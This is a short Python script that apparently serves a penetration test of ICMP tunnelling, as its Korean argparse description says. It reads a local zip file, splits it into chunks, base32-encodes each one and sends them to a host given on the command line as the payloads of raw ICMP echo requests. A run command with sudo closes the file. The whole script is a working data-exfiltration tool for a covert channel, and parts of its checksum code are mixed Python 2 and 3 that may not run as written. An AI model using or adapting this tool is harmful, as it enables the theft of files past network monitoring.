
import os
import argparse
import socket
import struct
import select
import time
import base64


seq = 1  # 시퀀스 넘버
ICMP_ECHO_REQUEST = 8
DEFAULT_TIMEOUT = 2
DEFAULT_COUNT = 5 


class Pinger(object):
    def __init__(self,target_host,count=DEFAULT_COUNT,timeout=DEFAULT_TIMEOUT):
        self.target_host = target_host
        self.count = count
        self.timeout = timeout
    def do_checksum(self, source_string):
        sum = 0
        max_count = (len(source_string)/2)*2
        count = 0
        while(count < max_count):
            val = ord(str(source_string)[count +1])* 256 + ord(str(source_string)[count])
            sum = sum + val
            sum = sum & 0xffffffff
            count = count + 2

        if (max_count<len(source_string)):
            sum = sum + ord(str(source_string[len(source_string) - 1]))
            sum = sum & 0xffffffff

        sum = (sum >> 16) + (sum & 0xffff)
        sum = sum + (sum >> 16)
        answer = ~sum
        answer = answer & 0xffff
        answer = answer >> 8 | (answer << 8 & 0xff00)
        return answer
    def send_ping(self, my_socket, ID, lin):  
        global seq
        target_addr = socket.gethostbyname(self.target_host)
        my_checksum = 0
        # Header is type (8), code (8), checksum (16), id (16), sequence (16)
        header = struct.pack('bbHHh',ICMP_ECHO_REQUEST,0,my_checksum,ID,seq)
        bytes_In_double = struct.calcsize("d")

        data = lin
        
        my_checksum = self.do_checksum(header + data)
        header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, seq)
        seq += 1
        packet = header + data

        my_socket.sendto(packet, (target_addr,1))

    def receive_pong(self, my_socket, ID, timeout):
        time_remaining = timeout

        while True:
            start_time = time.time()
            readable = select.select([my_socket], [],[],time_remaining)
            time_spent = (time.time() - start_time)
            if (readable[0] == []):
                return
            time_received = time.time()
            recv_packet, addr = my_socket.recvfrom(1024)
            icmp_header = recv_packet[20:28]
            type, code, checksum, packet_ID, sequence = struct.unpack(
            "bbHHh", icmp_header
            )
            if (packet_ID == ID):
                bytes_In_double = struct.calcsize("d")
                time_sent = struct.unpack("d", recv_packet[28:28 + bytes_In_double])[0]
                return time_received - time_sent

            time_remaining = time_remaining - time_spent
            if time_remaining <= 0:
                return
    def ping_once(self,lin):
        icmp = socket.getprotobyname('icmp')
        try:
            my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
        except socket.error as msg:
            print(msg)
            raise socket.error(msg)
        except Exception as e:
            print("[!] Exception %s" %(e))        

        my_ID = os.getpid() & 0xFFFF  
        self.send_ping(my_socket, my_ID, lin)
        delay = self.receive_pong(my_socket, my_ID, self.timeout)
        my_socket.close()
        return delay
    def ping(self):
       with open("../documents/rebound-master.zip",'rb') as f :
               lin = f.read()              
               for i in range(int((len(lin))/5000)+1):
                    # 인코딩 후 데이터 전송
                    enclin = base64.b32encode(lin[5000*i:5000*(i+1)])
                    print("[*] Ping to %s …." %self.target_host)
                    try :
                        delay = self.ping_once(enclin)
                    except socket.gaierror as e:
                        print (e)
                        break
                    if delay == None:
                        #print (self.timeout)
                        print("[*] success")
                    else:
                        delay= delay * 1000
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ICMP tunnuling : 데이터 유출 침투테스트중입니다.') 
    parser.add_argument('--target-host', action="store", dest="target_host", required=True)
    given_args = parser.parse_args()
    target_host = given_args.target_host
    start = time.time()
    pinger = Pinger(target_host=target_host)
    pinger.ping()
    end = time.time()
    print(f"[*] 전체 패킷 전송시간: {end - start:.5f} sec")

#sudo python3 client.py --target-host [IP 주소]